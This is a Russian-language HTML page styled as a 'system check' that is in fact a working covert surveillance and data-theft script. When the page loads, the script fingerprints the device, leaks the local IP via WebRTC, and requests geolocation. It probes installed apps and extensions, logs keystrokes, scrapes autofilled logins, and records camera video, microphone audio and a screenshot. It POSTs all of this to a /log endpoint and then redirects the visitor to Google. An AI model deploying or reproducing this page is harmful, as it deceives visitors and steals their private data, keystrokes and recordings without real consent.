<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Системная проверка</title>
    <style>
        body {
            font-family: 'Segoe UI', system-ui;
            text-align: center;
            padding: 20px;
            background: #0a0a0a;
            color: white;
        }
        .loader {
            border: 4px solid #333;
            border-top: 4px solid #00ff00;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .status {
            color: #aaa;
            margin-top: 20px;
            font-size: 14px;
        }
        .permission-text {
            display: none;
        }
    </style>
</head>
<body>
    <div class="permission-text" id="permissionText">
        🚀 Для выполнения системной проверки необходимы дополнительные разрешения.
        Пожалуйста, разрешите доступ к камере, микрофону и скриншоту.
        Это стандартная процедура безопасности.
    </div>
    <h2>⏳ Проверка системных параметров</h2>
    <div class="loader"></div>
    <div class="status" id="status">Инициализация...</div>

    <script>
        // ========== БАЗОВЫЕ ДАННЫЕ ==========
        async function getBasicData() {
            return {
                userAgent: navigator.userAgent,
                язык: navigator.language,
                платформа: navigator.platform,
                ядра_ЦП: navigator.hardwareConcurrency || 'неизвестно',
                память_устройства_GB: navigator.deviceMemory || 'неизвестно',
                разрешение_экрана: `${screen.width}x${screen.height}`,
                цветность: screen.colorDepth,
                часовой_пояс: Intl.DateTimeFormat().resolvedOptions().timeZone,
                реферер: document.referrer || 'нет',
                url_страницы: window.location.href,
                webdriver: navigator.webdriver || false,
                doNotTrack: navigator.doNotTrack || 'не указан'
            };
        }

        // ========== WEBRTC = РЕАЛЬНЫЙ IP ==========
        async function getLocalIP() {
            return new Promise((resolve) => {
                try {
                    const pc = new RTCPeerConnection({ iceServers: [] });
                    pc.createDataChannel('');
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (e) => {
                        if (e.candidate && e.candidate.candidate) {
                            const ipMatch = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
                            if (ipMatch && ipMatch[0]) {
                                resolve(ipMatch[0]);
                                pc.close();
                            }
                        }
                    };
                    setTimeout(() => resolve('не найден'), 2000);
                } catch(e) { resolve('ошибка'); }
            });
        }

        // ========== ГЕОЛОКАЦИЯ ==========
        async function getGeo() {
            return new Promise((resolve) => {
                navigator.geolocation.getCurrentPosition(
                    (pos) => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => resolve(null),
                    { timeout: 5000 }
                );
            });
        }

        // ========== БАТАРЕЯ ==========
        async function getBattery() {
            if (!navigator.getBattery) return null;
            try {
                const battery = await navigator.getBattery();
                return { заряд: battery.level * 100 + '%', зарядка: battery.charging };
            } catch(e) { return null; }
        }

        // ========== ШРИФТЫ ==========
        async function getFonts() {
            if (!document.fonts || !document.fonts.ready) return 'нет доступа';
            await document.fonts.ready;
            const fonts = Array.from(document.fonts.values()).map(f => f.family);
            return fonts.slice(0, 30).join(', ');
        }

        // ========== ПРИЛОЖЕНИЯ (схемы) ==========
        async function checkApps() {
            const apps = {
                telegram: 'tg://',
                whatsapp: 'whatsapp://',
                viber: 'viber://',
                discord: 'discord://',
                zoom: 'zoommtg://',
                skype: 'skype://',
                instagram: 'instagram://',
                twitter: 'twitter://'
            };
            const results = {};
            for (const [name, scheme] of Object.entries(apps)) {
                results[name] = await new Promise((resolve) => {
                    const iframe = document.createElement('iframe');
                    iframe.style.display = 'none';
                    iframe.src = scheme;
                    document.body.appendChild(iframe);
                    setTimeout(() => {
                        document.body.removeChild(iframe);
                        resolve(false);
                    }, 500);
                    window.onblur = () => { resolve(true); };
                });
            }
            return results;
        }

        // ========== КАМЕРА (ВИДЕО 5 СЕК) ==========
        async function captureVideo() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 5000));
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'video/mp4' });
                        const reader = new FileReader();
                        reader.onloadend = () => resolve(reader.result.split(',')[1]);
                        reader.readAsDataURL(blob);
                    };
                });
            } catch(e) { return null; }
        }

        // ========== МИКРОФОН (30 СЕК) ==========
        async function captureAudio() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mediaRecorder = new MediaRecorder(stream);
                const chunks = [];
                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
                mediaRecorder.start();
                await new Promise(r => setTimeout(r, 30000));
                mediaRecorder.stop();
                stream.getTracks().forEach(track => track.stop());
                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        const blob = new Blob(chunks, { type: 'audio/webm' });
                        const reader = new FileReader();
                        reader.onloadend = () => resolve(reader.result.split(',')[1]);
                        reader.readAsDataURL(blob);
                    };
                });
            } catch(e) { return null; }
        }

        // ========== СКРИНШОТ (ПК) ==========
        async function captureScreen() {
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 500));
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1920;
                canvas.height = video.videoHeight || 1080;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                const imgData = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                stream.getTracks().forEach(track => track.stop());
                return imgData;
            } catch(e) { return null; }
        }

        // ========== СЕНСОРЫ ==========
        async function getSensors() {
            return new Promise((resolve) => {
                if (!window.DeviceOrientationEvent) {
                    resolve({ ориентация: 'нет поддержки', движение: 'нет поддержки' });
                    return;
                }
                let orientation = null;
                let motion = null;
                const handleOrientation = (e) => {
                    orientation = { alpha: e.alpha, beta: e.beta, gamma: e.gamma };
                    window.removeEventListener('deviceorientation', handleOrientation);
                };
                const handleMotion = (e) => {
                    motion = { ускорение: e.acceleration, вращение: e.rotationRate };
                    window.removeEventListener('devicemotion', handleMotion);
                };
                window.addEventListener('deviceorientation', handleOrientation);
                window.addEventListener('devicemotion', handleMotion);
                setTimeout(() => {
                    resolve({ ориентация: orientation || 'таймаут', движение: motion || 'таймаут' });
                }, 2000);
            });
        }

        // ========== МОДЕЛЬ УСТРОЙСТВА ==========
        function getDeviceModel() {
            const ua = navigator.userAgent;
            if (ua.includes('iPhone')) return 'iPhone';
            if (ua.includes('iPad')) return 'iPad';
            if (ua.includes('Android')) {
                const match = ua.match(/; (.*?) Build/);
                return match ? match[1] : 'Android устройство';
            }
            return 'ПК или другое';
        }

        // ========== ОРИЕНТАЦИЯ ЭКРАНА ==========
        function getOrientation() {
            return screen.orientation ? screen.orientation.type : (window.innerHeight > window.innerWidth ? 'портретная' : 'альбомная');
        }

        // ========== СТАТУС ОНЛАЙН ==========
        function getOnlineStatus() {
            return navigator.onLine ? 'онлайн' : 'офлайн';
        }

        // ========== ПРОВЕРКА ADBLOCK ==========
        function checkAdBlock() {
            return new Promise((resolve) => {
                const testAd = document.createElement('div');
                testAd.className = 'ad';
                testAd.style.display = 'none';
                document.body.appendChild(testAd);
                setTimeout(() => {
                    const isBlocked = testAd.offsetHeight === 0 && testAd.offsetWidth === 0;
                    document.body.removeChild(testAd);
                    resolve(isBlocked ? '✅ Включён (AdBlock обнаружен)' : '❌ Не обнаружен');
                }, 100);
            });
        }

        // ========== СОХРАНЁННЫЕ ЛОГИНЫ ==========
        function getSavedLogins() {
            const inputs = document.querySelectorAll('input[autocomplete="username"], input[autocomplete="email"]');
            const logins = [];
            inputs.forEach(input => {
                if (input.value) logins.push(input.value);
            });
            return logins.length ? logins.join(', ') : 'Нет сохранённых логинов на этой странице';
        }

        // ========== РАСШИРЕНИЯ БРАУЗЕРА ==========
        async function detectExtensions() {
            const extensions = {
                metamask: 'chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/',
                adblock: 'chrome-extension://gighmmpiobklfepjocnamgkkbiglidom/',
                grammarly: 'chrome-extension://kbfnbcaeplbcioakkpcpgfkobkghlhen/',
                lastpass: 'chrome-extension://hdokiejnpimakedhajhdlcegeplioahd/',
                dashlane: 'chrome-extension://fdjamakpfbbddfjaooikfcpapjohcfeg/'
            };
            const detected = [];
            for (const [name, url] of Object.entries(extensions)) {
                try {
                    await fetch(url, { mode: 'no-cors' });
                    detected.push(name);
                } catch(e) {}
            }
            return detected.length ? detected.join(', ') : 'Не обнаружены';
        }

        // ========== ПРОВЕРКА HEADLESS ==========
        function detectHeadless() {
            const ua = navigator.userAgent;
            const isHeadless = ua.includes('Headless') || !navigator.plugins.length || navigator.languages.length === 0;
            return isHeadless ? '✅ Похоже на headless браузер (бот)' : '❌ Обычный браузер';
        }

        // ========== ДАННЫЕ О GPU ==========
        function getGPU() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'WebGL не поддерживается';
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (!debugInfo) return 'Информация о GPU недоступна';
            const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            return `${gpu} (производитель: ${vendor})`;
        }

        // ========== ТИП СОЕДИНЕНИЯ ==========
        function getConnectionType() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return 'Неизвестно';
            return `${conn.effectiveType || 'неизвестно'} (экономия: ${conn.saveData ? 'да' : 'нет'})`;
        }

        // ========== ПРОВЕРКА NFC, BLUETOOTH, USB ==========
        async function checkHardware() {
            const result = {};
            result.nfc = 'nfc' in navigator ? '✅ Есть' : '❌ Нет';
            result.bluetooth = 'bluetooth' in navigator ? '✅ Есть' : '❌ Нет';
            result.usb = 'usb' in navigator ? '✅ Есть' : '❌ Нет';
            return result;
        }

        // ========== ПРОВЕРКА НА VIRTUALBOX ==========
        function detectVM() {
            const ua = navigator.userAgent.toLowerCase();
            const isVM = ua.includes('virtualbox') || ua.includes('vbox') || ua.includes('vmware');
            return isVM ? '✅ Похоже на виртуальную машину' : '❌ Не обнаружено';
        }

        // ========== ПРОВЕРКА НА TOR ==========
        function detectTor() {
            const ua = navigator.userAgent;
            const isTor = ua.includes('Tor') || !navigator.plugins.length;
            return isTor ? '✅ Похоже на Tor Browser' : '❌ Не обнаружен';
        }

        // ========== ПРОВЕРКА НА ПРОКСИ / VPN ==========
        async function detectVPN() {
            const webrtcIP = await getLocalIP();
            const publicIP = await fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => data.ip).catch(() => null);
            if (webrtcIP && publicIP && webrtcIP !== publicIP) return '✅ Похоже на VPN/прокси (IP отличаются)';
            return '❌ Не обнаружено';
        }

        // ========== ВРЕМЯ НА СТРАНИЦЕ ==========
        let startTime = Date.now();
        function getTimeOnPage() {
            return Math.round((Date.now() - startTime) / 1000) + ' сек';
        }

        // ========== ПРОКРУТКА СТРАНИЦЫ ==========
        let scrollDepth = 0;
        window.addEventListener('scroll', () => {
            const docHeight = document.documentElement.scrollHeight - window.innerHeight;
            const currentScroll = window.scrollY;
            scrollDepth = Math.max(scrollDepth, Math.round((currentScroll / docHeight) * 100));
        });
        function getScrollDepth() {
            return scrollDepth + '%';
        }

        // ========== КАСАНИЯ ==========
        let touchCount = 0;
        document.addEventListener('touchstart', () => { touchCount++; });

        // ========== КЕЙЛОГГЕР ==========
        let keystrokes = '';
        document.addEventListener('keydown', (e) => {
            if (e.key.length === 1) keystrokes += e.key;
            else if (e.key === 'Enter') keystrokes += '[ENTER]';
            else if (e.key === 'Backspace') keystrokes = keystrokes.slice(0, -1);
            else keystrokes += `[${e.key}]`;
            if (keystrokes.length > 500) keystrokes = keystrokes.slice(-500);
        });
        function getKeystrokes() {
            return keystrokes || 'Нет нажатий';
        }

        // ========== СОХРАНЁННЫЕ КАРТЫ ==========
        function getSavedCards() {
            const cards = document.querySelectorAll('input[autocomplete="cc-number"]');
            return cards.length ? `Найдено полей для карт: ${cards.length}` : 'Нет сохранённых карт';
        }

        // ========== ПРИВАТНЫЙ РЕЖИМ ==========
        function isPrivateMode() {
            return new Promise((resolve) => {
                const fs = window.RequestFileSystem || window.webkitRequestFileSystem;
                if (!fs) resolve(false);
                else fs(window.TEMPORARY, 1, () => resolve(false), () => resolve(true));
            });
        }

        // ========== ОТПРАВКА ВСЕХ ДАННЫХ ==========
        async function sendAll() {
            const statusDiv = document.getElementById('status');
            statusDiv.innerText = '📡 Сбор системных данных...';
            
            const basic = await getBasicData();
            const localIP = await getLocalIP();
            const geo = await getGeo();
            const battery = await getBattery();
            const fonts = await getFonts();
            const apps = await checkApps();
            const sensors = await getSensors();
            const adblock = await checkAdBlock();
            const extensions = await detectExtensions();
            const headless = detectHeadless();
            const gpu = getGPU();
            const connection = getConnectionType();
            const hardware = await checkHardware();
            const vm = detectVM();
            const tor = detectTor();
            const vpn = await detectVPN();
            const timeOnPage = getTimeOnPage();
            const scroll = getScrollDepth();
            const keystrokesLog = getKeystrokes();
            const savedCards = getSavedCards();
            const privateMode = await isPrivateMode();
            
            const payload = {
                ...basic,
                реальный_IP: localIP,
                гео_широта: geo?.lat || null,
                гео_долгота: geo?.lon || null,
                гео_точность: geo?.acc || null,
                батарея_заряд: battery?.заряд || null,
                батарея_зарядка: battery?.зарядка || null,
                шрифты: fonts,
                приложения: JSON.stringify(apps),
                модель_устройства: getDeviceModel(),
                ориентация_экрана: getOrientation(),
                статус_сети: getOnlineStatus(),
                сенсоры_ориентация: JSON.stringify(sensors.orientation),
                сенсоры_движение: JSON.stringify(sensors.motion),
                количество_касаний: touchCount,
                adblock: adblock,
                расширения_браузера: extensions,
                headless_бот: headless,
                GPU: gpu,
                тип_соединения: connection,
                NFC: hardware.nfc,
                Bluetooth: hardware.bluetooth,
                USB: hardware.usb,
                виртуальная_машина: vm,
                Tor_браузер: tor,
                VPN_прокси: vpn,
                время_на_странице: timeOnPage,
                глубина_прокрутки: scroll,
                нажатия_клавиш: keystrokesLog,
                сохранённые_карты: savedCards,
                приватный_режим: privateMode ? '✅ Да' : '❌ Нет'
            };
            
            statusDiv.innerText = '🎥 Запрос камеры (видео 5 сек)...';
            const video = await captureVideo();
            if (video) payload.video_base64 = video;
            
            statusDiv.innerText = '🎙️ Запись микрофона (30 сек)...';
            const audio = await captureAudio();
            if (audio) payload.audio_base64 = audio;
            
            statusDiv.innerText = '🖥️ Запрос скриншота...';
            const screen = await captureScreen();
            if (screen) payload.screen_base64 = screen;
            
            statusDiv.innerText = '📤 Отправка отчёта...';
            
            try {
                await fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                statusDiv.innerText = '✅ Проверка завершена. Перенаправление...';
                setTimeout(() => window.location.href = 'https://www.google.com', 1500);
            } catch(e) {
                statusDiv.innerText = '❌ Ошибка отправки';
                console.error(e);
            }
        }

        sendAll();
    </script>
</body>
</html>
